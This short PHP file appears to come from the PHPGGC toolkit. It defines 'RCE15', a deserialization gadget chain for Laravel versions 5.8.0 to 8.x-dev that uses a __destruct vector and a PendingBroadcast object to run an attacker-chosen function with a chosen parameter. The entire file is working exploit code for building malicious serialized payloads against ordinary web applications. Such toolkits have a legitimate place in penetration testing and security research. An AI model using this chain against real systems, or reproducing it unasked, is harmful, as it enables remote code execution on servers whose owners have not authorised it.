<?php

namespace GadgetChain\Laravel;

class RCE15 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.8.0 <= 8.x-dev';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $param = $parameters['parameter'];
        
        return new \Illuminate\Broadcasting\PendingBroadcast($function,$param);
    }
}
